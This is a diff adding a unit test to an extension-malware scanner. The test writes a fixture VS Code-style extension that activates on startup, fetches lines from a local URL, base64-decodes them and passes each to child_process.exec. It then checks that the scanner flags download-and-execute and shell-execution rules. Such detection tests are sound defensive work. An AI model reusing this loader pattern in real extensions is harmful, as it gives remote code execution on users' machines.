@@ -3373,6 +3373,33 @@ class ScannerTests(unittest.TestCase):
         self.assertIn("dynamic-shell-execution", rule_ids)
         self.assertIn("download-and-execute", rule_ids)
 
+    def test_transpiled_base64_startup_command_chain_is_detected(self) -> None:
+        """Keep the reported remote-text-fetcher behavior pattern covered."""
+        with TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / "package.json").write_text(
+                '{"publisher":"example","name":"remote-command-fetcher","version":"1.0.0",'
+                '"activationEvents":["onStartupFinished"]}',
+                encoding="utf-8",
+            )
+            (root / "extension.js").write_text(
+                'const child_process_1 = require("child_process");'
+                'fetch("http://localhost:3000/file.txt")'
+                '.then(response => response.text())'
+                '.then(text => text.split("\\n").forEach(line => '
+                '(0, child_process_1.exec)(Buffer.from(line, "base64").toString("utf8"))));',
+                encoding="utf-8",
+            )
+
+            report = scan_extension(root)
+
+        rule_ids = {finding.rule_id for finding in report.findings}
+        self.assertEqual(report.verdict, "suspicious")
+        self.assertEqual(report.decision, "review")
+        self.assertIn("process-execution", rule_ids)
+        self.assertIn("dynamic-shell-execution", rule_ids)
+        self.assertIn("download-and-execute", rule_ids)
+
     def test_namespace_process_alias_property_access_is_not_execution(self) -> None:
         with TemporaryDirectory() as tmp:
             root = Path(tmp)
